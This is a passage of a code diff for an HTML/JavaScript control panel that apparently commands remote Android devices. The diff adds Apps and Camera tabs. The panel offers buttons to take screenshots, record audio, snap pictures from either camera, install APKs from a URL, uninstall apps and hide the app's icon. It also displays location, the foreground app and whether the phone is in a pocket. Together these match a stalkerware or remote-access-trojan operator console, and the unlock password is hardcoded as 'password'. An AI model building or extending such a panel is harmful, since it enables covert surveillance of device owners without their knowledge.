@@ -23,12 +23,7 @@
             --transition: all 0.3s ease;
         }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: 'Segoe UI', Roboto, -apple-system, BlinkMacSystemFont, sans-serif;
             background-color: var(--background);
@@ -41,7 +36,6 @@
             margin: 0;
             padding: 20px;
         }
-
         .container {
             width: 100%;
             max-width: 800px;
@@ -51,34 +45,16 @@
             overflow: hidden;
             transition: var(--transition);
         }
-
         .header {
             background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
             color: white;
             padding: 20px;
             text-align: center;
         }
-
-        .header h2 {
-            margin: 0;
-            font-weight: 600;
-        }
-
-        .content {
-            padding: 25px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: var(--text-color);
-        }
-
+        .header h2 { margin: 0; font-weight: 600; }
+        .content { padding: 25px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 500; color: var(--text-color); }
         select, input, button {
             width: 100%;
             padding: 12px 15px;
@@ -88,13 +64,11 @@
             transition: var(--transition);
             background-color: white;
         }
-
         select:focus, input:focus {
             outline: none;
             border-color: var(--primary-color);
             box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
         }
-
         button {
             background-color: var(--primary-color);
             color: white;
@@ -106,26 +80,10 @@
             justify-content: center;
             gap: 8px;
         }
-
-        button:hover {
-            background-color: var(--primary-dark);
-        }
-
-        button:disabled {
-            background-color: #adb5bd;
-            cursor: not-allowed;
-        }
-
-        .button-group {
-            display: flex;
-            gap: 12px;
-            margin-top: 20px;
-        }
-
-        .button-group button {
-            flex: 1;
-        }
-
+        button:hover { background-color: var(--primary-dark); }
+        button:disabled { background-color: #adb5bd; cursor: not-allowed; }
+        .button-group { display: flex; gap: 12px; margin-top: 20px; }
+        .button-group button { flex: 1; }
         .status-log {
             margin-top: 20px;
             padding: 15px;
@@ -134,282 +92,50 @@
             text-align: left;
             font-weight: 500;
         }
-
-        .log-info {
-            background-color: #e7f1ff;
-            color: #004085;
-            border-left: 4px solid var(--primary-color);
-        }
-
-        .log-success {
-            background-color: #d4edda;
-            color: #155724;
-            border-left: 4px solid var(--success-color);
-        }
-
-        .log-error {
-            background-color: #f8d7da;
-            color: #721c24;
-            border-left: 4px solid var(--error-color);
-        }
-
-        .data-panel {
-            margin-top: 20px;
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: var(--border-radius);
-            border: 1px solid #e9ecef;
-        }
-
-        .data-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 15px;
-        }
-
-        .data-item {
-            background: white;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-        }
-
-        .data-label {
-            font-weight: 600;
-            color: var(--text-light);
-            font-size: 14px;
-            margin-bottom: 5px;
-        }
-
-        .data-value {
-            color: var(--text-color);
-            font-weight: 500;
-            font-size: 16px;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.6);
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(5px);
-        }
-
-        .modal-content {
-            background-color: var(--card-bg);
-            padding: 25px;
-            border-radius: var(--border-radius);
-            width: 90%;
-            max-width: 600px;
-            max-height: 90vh;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-        }
-
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #eee;
-        }
-
-        .modal-header h3 {
-            margin: 0;
-            color: var(--primary-color);
-        }
-
-        .close-btn {
-            background: none;
-            border: none;
-            font-size: 24px;
-            cursor: pointer;
-            color: var(--text-light);
-            width: 30px;
-            height: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-        }
-
-        .close-btn:hover {
-            background-color: #f1f1f1;
-        }
-
-        #visualizer {
-            width: 100%;
-            height: 350px;
-            background-color: #e9ecef;
-            border-radius: 8px;
-            margin: 10px 0;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .position-analysis {
-            background: #e7f1ff;
-            border-radius: var(--border-radius);
-            padding: 15px;
-            margin-top: 15px;
-            text-align: center;
-            border: 1px solid #b8d0ff;
-        }
-
-        .position-analysis h4 {
-            font-size: 16px;
-            color: var(--primary-dark);
-            margin: 0;
-        }
-        
-        #app-list-container {
-            max-height: 60vh;
-            overflow-y: auto;
-            margin-top: 15px;
-        }
-
-        .app-list-header {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 0;
-            border-bottom: 1px solid #eee;
-            font-weight: 600;
-            position: sticky;
-            top: 0;
-            background: white;
-            z-index: 1;
-        }
-
-        .app-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 0;
-            border-bottom: 1px solid #f5f5f5;
-            align-items: center;
-            cursor: pointer; /* New: Make apps clickable */
-        }
-        .app-item:hover {
-            background-color: #f8f9fa;
-        }
-
-        .app-name {
-            font-weight: 500;
-            flex: 2;
-        }
-
-        .app-package {
-            font-size: 12px;
-            color: var(--text-light);
-            flex: 3;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
-
-        .search-box {
-            margin-bottom: 15px;
-        }
-
-        #password-view {
-            padding: 30px;
-            text-align: center;
-        }
-
-        #password-view h2 {
-            margin-bottom: 20px;
-            color: var(--primary-color);
-        }
-
-        #password-view input {
-            margin-bottom: 15px;
-        }
-
-        #admin-panel-view {
-            display: none;
-        }
-
-        .loading-spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .tab-container {
-            display: flex;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #eee;
-        }
-
-        .tab {
-            padding: 10px 20px;
-            cursor: pointer;
-            border-bottom: 3px solid transparent;
-            font-weight: 500;
-            transition: var(--transition);
-        }
-
-        .tab.active {
-            border-bottom-color: var(--primary-color);
-            color: var(--primary-color);
-        }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        /* New Styles for Media Tab and Screenshot Modal */
-        .media-control-group {
-            border: 1px solid #eee;
-            border-radius: var(--border-radius);
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        .media-control-group h3 {
-            margin-top: 0;
-            margin-bottom: 15px;
-            border-bottom: 1px solid #eee;
-            padding-bottom: 10px;
-        }
-        .input-with-button {
-            display: flex;
-            gap: 10px;
-            margin-top: 10px;
-        }
-        .input-with-button input {
-            flex-grow: 1;
-        }
-        .input-with-button button {
-            flex-shrink: 0;
-            width: auto;
-        }
-        #screenshot-image {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            margin-top: 15px;
-        }
-
+        .log-info { background-color: #e7f1ff; color: #004085; border-left: 4px solid var(--primary-color); }
+        .log-success { background-color: #d4edda; color: #155724; border-left: 4px solid var(--success-color); }
+        .log-error { background-color: #f8d7da; color: #721c24; border-left: 4px solid var(--error-color); }
+        .data-panel { margin-top: 20px; background: #f8f9fa; padding: 20px; border-radius: var(--border-radius); border: 1px solid #e9ecef; }
+        .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
+        .data-item { background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+        .data-label { font-weight: 600; color: var(--text-light); font-size: 14px; margin-bottom: 5px; }
+        .data-value { color: var(--text-color); font-weight: 500; font-size: 16px; }
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); align-items: center; justify-content: center; backdrop-filter: blur(5px); }
+        .modal-content { background-color: var(--card-bg); padding: 25px; border-radius: var(--border-radius); width: 90%; max-width: 600px; max-height: 90vh; overflow-y: auto; display: flex; flex-direction: column; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #eee; }
+        .modal-header h3 { margin: 0; color: var(--primary-color); }
+        .close-btn { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-light); width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; border-radius: 50%; }
+        .close-btn:hover { background-color: #f1f1f1; }
+        #visualizer { width: 100%; height: 350px; background-color: #e9ecef; border-radius: 8px; margin: 10px 0; position: relative; overflow: hidden; }
+        .position-analysis { background: #e7f1ff; border-radius: var(--border-radius); padding: 15px; margin-top: 15px; text-align: center; border: 1px solid #b8d0ff; }
+        .position-analysis h4 { font-size: 16px; color: var(--primary-dark); margin: 0; }
+        #app-list-container { max-height: 60vh; overflow-y: auto; margin-top: 15px; }
+        .app-list-header { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-weight: 600; position: sticky; top: 0; background: white; z-index: 1; }
+        .app-item { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f5f5f5; align-items: center; cursor: pointer; }
+        .app-item:hover { background-color: #f8f9fa; }
+        .app-name { font-weight: 500; flex: 2; }
+        .app-package { font-size: 12px; color: var(--text-light); flex: 3; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .search-box { margin-bottom: 15px; }
+        #password-view { padding: 30px; text-align: center; }
+        #password-view h2 { margin-bottom: 20px; color: var(--primary-color); }
+        #password-view input { margin-bottom: 15px; }
+        #admin-panel-view { display: none; }
+        .loading-spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .tab-container { display: flex; margin-bottom: 20px; border-bottom: 1px solid #eee; }
+        .tab { padding: 10px 20px; cursor: pointer; border-bottom: 3px solid transparent; font-weight: 500; transition: var(--transition); }
+        .tab.active { border-bottom-color: var(--primary-color); color: var(--primary-color); }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .control-group { border: 1px solid #eee; border-radius: var(--border-radius); padding: 20px; margin-bottom: 20px; }
+        .control-group h3 { margin-top: 0; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+        .input-with-button { display: flex; gap: 10px; margin-top: 10px; }
+        .input-with-button input { flex-grow: 1; }
+        .input-with-button button { flex-shrink: 0; width: auto; }
+        #image-display { max-width: 100%; height: auto; border-radius: 8px; margin-top: 15px; }
+        .slider-group { display: flex; align-items: center; gap: 15px; }
+        .slider-group input[type="range"] { flex-grow: 1; }
+        .slider-group span { font-weight: 500; min-width: 30px; text-align: center; }
     </style>
 </head>
 <body>
@@ -430,34 +156,33 @@
                 <div class="tab-container">
                     <div class="tab active" onclick="switchTab('control-tab')">Control</div>
                     <div class="tab" onclick="switchTab('data-tab')">Device Data</div>
-                    <div class="tab" onclick="switchTab('media-tab')">Media</div> <!-- New Tab -->
+                    <div class="tab" onclick="switchTab('media-tab')">Media</div>
+                    <div class="tab" onclick="switchTab('apps-tab')">Apps</div>
+                    <div class="tab" onclick="switchTab('camera-tab')">Camera</div>
                 </div>
 
                 <div id="control-tab" class="tab-content active">
-                    <div class="form-group">
-                        <label for="device-dropdown">Select Device</label>
-                        <select id="device-dropdown" onchange="onDeviceSelected()">
-                            <option value="">-- Loading Devices --</option>
-                        </select>
+                     <div class="control-group">
+                        <h3>Main Controls</h3>
+                        <div class="form-group">
+                            <label for="device-dropdown">Select Device</label>
+                            <select id="device-dropdown" onchange="onDeviceSelected()">
+                                <option value="">-- Loading Devices --</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="action-dropdown">Select Command</label>
+                            <select id="action-dropdown">
+                                <option value="">-- Loading Commands --</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="backend-password">API Password</label>
+                            <input type="password" id="backend-password" placeholder="Enter Backend API Password">
+                        </div>
+                        <button id="send-button" onclick="sendCommandFromDropdown()">Send Command</button>
                     </div>
-
-                    <div class="form-group">
-                        <label for="action-dropdown">Select Command</label>
-                        <select id="action-dropdown">
-                            <option value="">-- Loading Commands --</option>
-                        </select>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="backend-password">API Password</label>
-                        <input type="password" id="backend-password" placeholder="Enter Backend API Password">
-                    </div>
-
-                    <button id="send-button" onclick="sendCommandFromDropdown()">Send Command</button>
-
-                    <div id="status-log" class="status-log log-info">
-                        Awaiting command...
-                    </div>
+                    <div id="status-log" class="status-log log-info">Awaiting command...</div>
                 </div>
 
                 <div id="data-tab" class="tab-content">
@@ -472,42 +197,74 @@
                             <div class="data-item"><div class="data-label">Light Level</div><div class="data-value" id="data-light">--</div></div>
                         </div>
                     </div>
-
                     <div class="button-group">
                         <button id="refresh-btn" onclick="forceRefresh()"><span id="refresh-text">Refresh Data</span><span id="refresh-spinner" class="loading-spinner" style="display: none;"></span></button>
                         <button id="visualize-btn" onclick="showModal('visualizer-modal')" disabled>Visualize Orientation</button>
-                        <button id="apps-btn" onclick="showAppList()">View Installed Apps</button>
+                        <button id="apps-btn" onclick="showAppListModal()">View Installed Apps</button>
                     </div>
                 </div>
 
-                <!-- New Media Tab Content -->
                 <div id="media-tab" class="tab-content">
-                    <div class="media-control-group">
-                        <h3>Screen & Audio</h3>
-                        <div class="button-group">
-                           <button onclick="sendCommandWithValue('take_screenshot')">Request Screenshot</button>
+                    <div class="control-group">
+                        <h3>Audio Control</h3>
+                         <div class="button-group">
                            <button onclick="sendCommandWithValue('start_rec')">Start Recording</button>
                            <button onclick="sendCommandWithValue('stop_rec')">Stop Recording</button>
                         </div>
-                    </div>
-                    <div class="media-control-group">
-                        <h3>Play Media</h3>
+                        <br>
                         <div class="input-with-button">
                             <input type="text" id="sound-url-input" placeholder="https://example.com/sound.mp3">
                             <button onclick="playSound()">Play Sound</button>
                         </div>
+                    </div>
+                     <div class="control-group">
+                        <h3>Volume Control</h3>
+                        <div class="slider-group">
+                            <input type="range" id="volume-slider" min="0" max="100" value="50" oninput="document.getElementById('volume-value').textContent = this.value">
+                            <span id="volume-value">50</span>
+                        </div>
+                         <div class="button-group">
+                           <button onclick="setVolume()">Set Volume</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="apps-tab" class="tab-content">
+                    <div class="control-group">
+                        <h3>Application Management</h3>
+                        <div class="input-with-button">
+                             <input type="text" id="app-url-input" placeholder="https://example.com/app.apk">
+                            <button onclick="installApp()">Install App</button>
+                        </div>
                         <br>
+                        <div class="input-with-button">
+                            <input type="text" id="app-package-input" placeholder="com.example.app">
+                            <button onclick="uninstallApp()">Uninstall App</button>
+                        </div>
+                    </div>
+                     <div class="control-group">
+                        <h3>App Visibility</h3>
+                         <div class="button-group">
+                           <button onclick="sendCommandWithValue('hide_icon')">Hide App Icon</button>
+                           <button onclick="sendCommandWithValue('show_icon')">Show App Icon</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="camera-tab" class="tab-content">
+                     <div class="control-group">
+                        <h3>Screen & Camera</h3>
+                        <div class="button-group">
+                           <button onclick="sendCommandWithValue('take_screenshot')">Request Screenshot</button>
+                           <button onclick="takePicture(0)">Take Pic (Cam 1)</button>
+                           <button onclick="takePicture(1)">Take Pic (Cam 2)</button>
+                        </div>
+                    </div>
+                     <div class="control-group">
+                        <h3>Show Image on Screen</h3>
                         <div class="input-with-button">
                              <input type="text" id="image-url-input" placeholder="https://example.com/image.jpg">
                             <button onclick="showImage()">Show Image</button>
-                        </div>
-                    </div>
-                     <div class="media-control-group">
-                        <h3>Volume Control</h3>
-                         <div class="button-group">
-                           <button onclick="sendCommandWithValue('vol_up')">Volume Up</button>
-                           <button onclick="sendCommandWithValue('vol_down')">Volume Down</button>
-                           <button onclick="sendCommandWithValue('vol_mute')">Mute/Unmute</button>
                         </div>
                     </div>
                 </div>
@@ -518,73 +275,84 @@
     <!-- Modals -->
     <div id="app-list-modal" class="modal" onclick="hideModal('app-list-modal')"><div class="modal-content" onclick="event.stopPropagation()"><div class="modal-header"><h3>Installed Applications</h3><button class="close-btn" onclick="hideModal('app-list-modal')">&times;</button></div><div class="search-box"><input type="text" id="app-search" placeholder="Search applications..." onkeyup="filterApps()"></div><div class="app-list-header"><div class="app-name">Application Name</div><div class="app-package">Package Name</div></div><div id="app-list-container"></div></div></div>
     <div id="visualizer-modal" class="modal" onclick="hideModal('visualizer-modal')"><div class="modal-content" onclick="event.stopPropagation()"><div class="modal-header"><h3>Contextual Device Visualization</h3><button class="close-btn" onclick="hideModal('visualizer-modal')">&times;</button></div><div id="visualizer"></div><div class="position-analysis"><h4>Position Analysis: <span id="position-status">--</span></h4></div><p style="text-align:center; font-size:12px; margin-top:15px; color:var(--text-light);">Click and drag to rotate view. Scroll to zoom.</p></div></div>
-    <!-- New Screenshot Modal -->
-    <div id="screenshot-modal" class="modal" onclick="hideModal('screenshot-modal')"><div class="modal-content" onclick="event.stopPropagation()"><div class="modal-header"><h3>Screenshot</h3><button class="close-btn" onclick="hideModal('screenshot-modal')">&times;</button></div><img id="screenshot-image" src="" alt="Device Screenshot"></div></div>
+    <div id="image-modal" class="modal" onclick="hideModal('image-modal')"><div class="modal-content" onclick="event.stopPropagation()"><div class="modal-header"><h3 id="image-modal-title">Image</h3><button class="close-btn" onclick="hideModal('image-modal')">&times;</button></div><img id="image-display" src="" alt="Device Capture"></div></div>
 
     <script>
-        // Configuration
-        const UI_UNLOCK_PASSWORD = "password";
-        const COMMANDS_JSON_URL = "https://raw.githubusercontent.com/Jasim9085/Raw-Files/main/commands.json";
-        const DEVICES_JSON_URL = "https://raw.githubusercontent.com/Jasim9085/Raw-Files/main/devices.json";
+        const UI_UNLOCK_PASSWORD="password",COMMANDS_JSON_URL="https://raw.githubusercontent.com/Jasim9085/Raw-Files/main/commands.json",DEVICES_JSON_URL="https://raw.githubusercontent.com/Jasim9085/Raw-Files/main/devices.json";let installedApps={},isAuthenticated="true"===sessionStorage.getItem("isAuthenticated"),scene,camera,renderer,controls,phoneModel,pocketModel,animationFrameId;function initVisualizer(){const e=document.getElementById("visualizer");e&&(e.innerHTML="",scene=new THREE.Scene,scene.background=new THREE.Color(15329769),camera=new THREE.PerspectiveCamera(50,e.clientWidth/e.clientHeight,.1,100),camera.position.set(0,1.6,6),renderer=new THREE.WebGLRenderer({antialias:!0}),renderer.setSize(e.clientWidth,e.clientHeight),renderer.setPixelRatio(window.devicePixelRatio),renderer.shadowMap.enabled=!0,e.appendChild(renderer.domElement),scene.add(new THREE.AmbientLight(16777215,.6)),(e=>{const t=new THREE.DirectionalLight(16777215,.8);t.position.set(5,10,7),t.castShadow=!0,scene.add(t)})(),controls=new THREE.OrbitControls(camera,renderer.domElement),controls.enableDamping=!0,controls.target.set(0,1.2,0),createEnvironment(),createPhoneModel(),startAnimationLoop(),window.addEventListener("resize",onWindowResize))}function createEnvironment(){const e=new THREE.BoxGeometry(5,.15,3),t=new THREE.MeshStandardMaterial({color:11388093}),o=new THREE.Mesh(e,t);o.position.y=0,o.receiveShadow=!0,scene.add(o);const n=new THREE.PlaneGeometry(20,20),a=new THREE.MeshStandardMaterial({color:16314874,roughness:.8}),i=new THREE.Mesh(n,a);i.rotation.x=-Math.PI/2,i.position.y=-.075,i.receiveShadow=!0,scene.add(i);const d=new THREE.BoxGeometry(1,1.8,.5),s=new THREE.MeshStandardMaterial({color:7104157,transparent:!0,opacity:.3,roughness:.7});pocketModel=new THREE.Mesh(d,s),pocketModel.visible=!1,scene.add(pocketModel)}function createPhoneModel(){phoneModel=new THREE.Group;const e=new THREE.BoxGeometry(.8,1.6,.1),t=new THREE.MeshStandardMaterial({color:1703936,metalness:.7,roughness:.3}),o=new THREE.Mesh(e,t);o.castShadow=!0;const n=document.createElement("canvas");n.width=128,n.height=256;const a=n.getContext("2d");a.fillStyle="#222",a.fillRect(0,0,128,256),a.fillStyle="#FFF",a.fillRect(24,240,80,8);const i=new THREE.CanvasTexture(n),d=new THREE.BoxGeometry(.75,1.55,.02),s=new THREE.MeshStandardMaterial({map:i,roughness:.1,metalness:.2}),c=new THREE.Mesh(d,s);c.position.z=.055,phoneModel.add(o,c),scene.add(phoneModel)}
         
-        let installedApps = {}, isAuthenticated = sessionStorage.getItem('isAuthenticated') === 'true';
-        let scene, camera, renderer, controls, phoneModel, pocketModel;
-        let animationFrameId;
+        // UPGRADED: More robust visualization for devices with fewer sensors.
+        function analyzeAndSetPosition(data) {
+            if (!phoneModel) return;
 
-        // --- VISUALIZATION LOGIC (Unchanged) ---
-        function initVisualizer(){const t=document.getElementById("visualizer");if(t){t.innerHTML="",scene=new THREE.Scene,scene.background=new THREE.Color(15329769),camera=new THREE.PerspectiveCamera(50,t.clientWidth/t.clientHeight,.1,100),camera.position.set(0,1.6,6),renderer=new THREE.WebGLRenderer({antialias:!0}),renderer.setSize(t.clientWidth,t.clientHeight),renderer.setPixelRatio(window.devicePixelRatio),renderer.shadowMap.enabled=!0,t.appendChild(renderer.domElement),scene.add(new THREE.AmbientLight(16777215,.6));const e=new THREE.DirectionalLight(16777215,.8);e.position.set(5,10,7),e.castShadow=!0,scene.add(e),controls=new THREE.OrbitControls(camera,renderer.domElement),controls.enableDamping=!0,controls.target.set(0,1.2,0),createEnvironment(),createPhoneModel(),startAnimationLoop(),window.addEventListener("resize",onWindowResize)}}
-        function createEnvironment(){const t=new THREE.BoxGeometry(5,.15,3),e=new THREE.MeshStandardMaterial({color:11388093}),o=new THREE.Mesh(t,e);o.position.y=0,o.receiveShadow=!0,scene.add(o);const n=new THREE.PlaneGeometry(20,20),a=new THREE.MeshStandardMaterial({color:16314874,roughness:.8}),i=new THREE.Mesh(n,a);i.rotation.x=-Math.PI/2,i.position.y=-.075,i.receiveShadow=!0,scene.add(i);const s=new THREE.BoxGeometry(1,1.8,.5),d=new THREE.MeshStandardMaterial({color:7104157,transparent:!0,opacity:.3,roughness:.7});pocketModel=new THREE.Mesh(s,d),pocketModel.visible=!1,scene.add(pocketModel)}
-        function createPhoneModel(){phoneModel=new THREE.Group;const t=new THREE.BoxGeometry(.8,1.6,.1),e=new THREE.MeshStandardMaterial({color:1703936,metalness:.7,roughness:.3}),o=new THREE.Mesh(t,e);o.castShadow=!0;const n=document.createElement("canvas");n.width=128,n.height=256;const a=n.getContext("2d");a.fillStyle="#222",a.fillRect(0,0,128,256),a.fillStyle="#FFF",a.fillRect(24,240,80,8);const i=new THREE.CanvasTexture(n),s=new THREE.BoxGeometry(.75,1.55,.02),d=new THREE.MeshStandardMaterial({map:i,roughness:.1,metalness:.2}),c=new THREE.Mesh(s,d);c.position.z=.055,phoneModel.add(o,c),scene.add(phoneModel)}
-        function analyzeAndSetPosition(t){if(phoneModel){let e=new THREE.Quaternion,o=!1;const n=t.rotation_vector||t.game_rotation_vector||t.geomagnetic_rotation_vector;if(n&&void 0!==n.w)e.set(n.x,n.y,n.z,n.w),o=!0;else if(t.gravity&&t.magnetometer){const n=new THREE.Vector3(t.gravity.x,t.gravity.y,t.gravity.z).normalize(),a=new THREE.Vector3(t.magnetometer.x,t.magnetometer.y,t.magnetometer.z).normalize(),i=a.clone().cross(n).normalize(),s=n.clone().cross(i).normalize(),d=new THREE.Matrix4().makeBasis(i,s,n);e.setFromRotationMatrix(d),o=!0}if(o){const t=new THREE.Quaternion().setFromAxisAngle(new THREE.Vector3(1,0,0),-Math.PI/2);e.multiplyQuaternions(t,e),phoneModel.quaternion.slerp(e,.5)}let a="Undetermined";pocketModel.visible=!1;const i=t.context_events;i?.pocket_mode?(a="In Pocket",pocketModel.visible=!0,pocketModel.position.set(0,1.2,0),phoneModel.position.copy(pocketModel.position)):void 0!==i?.face_up_down?(a=0===i.face_up_down?"On Surface (Face Up)":"On Surface (Face Down)",phoneModel.position.set(0,.125,0)):t.proximity?.distance<2&&t.light?.lux<10?(a="In Pocket / Bag",pocketModel.visible=!0,pocketModel.position.set(0,1.2,0),phoneModel.position.copy(pocketModel.position)):t.proximity?.distance<2?(a="Calling Position",phoneModel.position.set(0,1.3,0)):t.gravity?Math.abs(t.gravity.z)>9? (a="On a Surface",phoneModel.position.set(0,.125,0)):(a="In Hand",phoneModel.position.set(0,1.3,0)):phoneModel.position.set(0,1.3,0),document.getElementById("position-status").textContent=a}}
-        function startAnimationLoop(){animationFrameId&&cancelAnimationFrame(animationFrameId);const t=()=>{animationFrameId=requestAnimationFrame(t),controls.update(),renderer.render(scene,camera)};t()}
-        function stopAnimationLoop(){animationFrameId&&(cancelAnimationFrame(animationFrameId),animationFrameId=null),window.removeEventListener("resize",onWindowResize)}
-        function onWindowResize(){const t=document.getElementById("visualizer");if(t&&camera&&renderer)camera.aspect=t.clientWidth/t.clientHeight,camera.updateProjectionMatrix(),renderer.setSize(t.clientWidth,t.clientHeight)}
+            let orientationQuat = new THREE.Quaternion();
+            let hasGoodOrientation = false;
 
-        // --- Core Dashboard Functions (Updated) ---
-        function switchTab(t){document.querySelectorAll(".tab-content").forEach(t=>t.classList.remove("active")),document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active")),document.getElementById(t).classList.add("active"),document.querySelector(`.tab[onclick="switchTab('${t}')"]`).classList.add("active")}
-        function checkUiPassword(){document.getElementById("ui-password-input").value===UI_UNLOCK_PASSWORD?(sessionStorage.setItem("isAuthenticated","true"),isAuthenticated=!0,showAdminPanel()):alert("Incorrect password! Please try again.")}
-        function showAdminPanel(){document.getElementById("password-view").style.display="none",document.getElementById("admin-panel-view").style.display="block",document.getElementById("device-dropdown").options.length<=1&&(populateDropdown("device-dropdown",DEVICES_JSON_URL,"Device"),populateDropdown("action-dropdown",COMMANDS_JSON_URL,"Command"))}
-        async function populateDropdown(t,e,o){const n=document.getElementById(t);try{const a=await fetch(e);if(!a.ok)throw new Error(`Failed to fetch ${o}s`);const i=await a.json();n.innerHTML="",n.add(new Option(`-- Select a ${o} --`,"")),i.forEach(t=>{n.add(new Option(t.name||t.value,t.id||t.value,!1,t.disabled))})}catch(a){console.error(`Error loading ${o}s:`,a),n.innerHTML=`<option value="">-- Error Loading ${o}s --</option>`}}
-        function showModal(t){document.getElementById(t).style.display="flex",t==="visualizer-modal"&&!animationFrameId&&(typeof THREE!="undefined"&&typeof THREE.OrbitControls!="undefined"?initVisualizer():document.getElementById("visualizer").innerHTML='<p style="color: red; text-align: center; padding-top: 50px;">Error: 3D visualization library failed to load.</p>')}
-        function hideModal(t){t==="visualizer-modal"&&stopAnimationLoop(),document.getElementById(t).style.display="none"}
-        
-        // MODIFIED: Removed automatic polling. Now only clears data fields.
-        function onDeviceSelected() {
-            const dataFields = ["data-screen", "data-battery", "data-charging", "data-location", "data-current-app", "data-proximity", "data-light"];
-            dataFields.forEach(id => safeUpdateElement(id, "--"));
-            document.getElementById("visualize-btn").disabled = true;
-            updateStatusLog("New device selected. Click 'Refresh Data' to fetch its status.", "info");
-        }
-
-        async function forceRefresh(){const t=document.getElementById("refresh-btn"),e=document.getElementById("refresh-text"),o=document.getElementById("refresh-spinner");t.disabled=!0,e.textContent="Refreshing...",o.style.display="inline-block",await fetchLatestData(),t.disabled=!1,e.textContent="Refresh Data",o.style.display="none"}
-        
-        async function fetchLatestData(){
-            const deviceId = document.getElementById("device-dropdown").value;
-            if(!deviceId) {
-                 updateStatusLog("Please select a device first.", "error");
-                 return;
+            const rotVec = data.rotation_vector || data.game_rotation_vector || data.geomagnetic_rotation_vector;
+            if (rotVec && rotVec.w !== undefined) {
+                orientationQuat.set(rotVec.x, rotVec.y, rotVec.z, rotVec.w);
+                hasGoodOrientation = true;
+            } else if (data.gravity && data.magnetometer) {
+                const G = new THREE.Vector3(data.gravity.x, data.gravity.y, data.gravity.z).normalize();
+                const M = new THREE.Vector3(data.magnetometer.x, data.magnetometer.y, data.magnetometer.z).normalize();
+                const E = M.clone().cross(G).normalize();
+                const N = G.clone().cross(E).normalize();
+                const orientationMatrix = new THREE.Matrix4().makeBasis(E, N, G);
+                orientationQuat.setFromRotationMatrix(orientationMatrix);
+                hasGoodOrientation = true;
             }
-            try {
-                const res = await fetch(`/.netlify/functions/get-status?deviceId=${deviceId}`);
-                if (res.status === 404) {
-                    updateStatusLog("No data found for this device yet. Send a command to initialize it.", "warning");
-                    return;
+
+            if (hasGoodOrientation) {
+                const correction = new THREE.Quaternion().setFromAxisAngle(new THREE.Vector3(1, 0, 0), -Math.PI / 2);
+                orientationQuat.multiplyQuaternions(correction, orientationQuat);
+                phoneModel.quaternion.slerp(orientationQuat, 0.5);
+            } else {
+                // Default to a neutral, upright position if no orientation data is available.
+                phoneModel.quaternion.slerp(new THREE.Quaternion(), 0.5);
+            }
+
+            let positionText = "Undetermined";
+            pocketModel.visible = false;
+
+            if (data.context_events?.pocket_mode) {
+                positionText = "In Pocket";
+                pocketModel.visible = true;
+                pocketModel.position.set(0, 1.2, 0);
+                phoneModel.position.copy(pocketModel.position);
+            } else if (data.context_events?.face_up_down !== undefined) {
+                positionText = data.context_events.face_up_down === 0 ? "On Surface (Face Up)" : "On Surface (Face Down)";
+                phoneModel.position.set(0, 0.075 + 0.05, 0);
+            } else if (data.proximity?.distance < 2 && data.light?.lux < 10) {
+                 positionText = "In Pocket / Bag";
+                 pocketModel.visible = true;
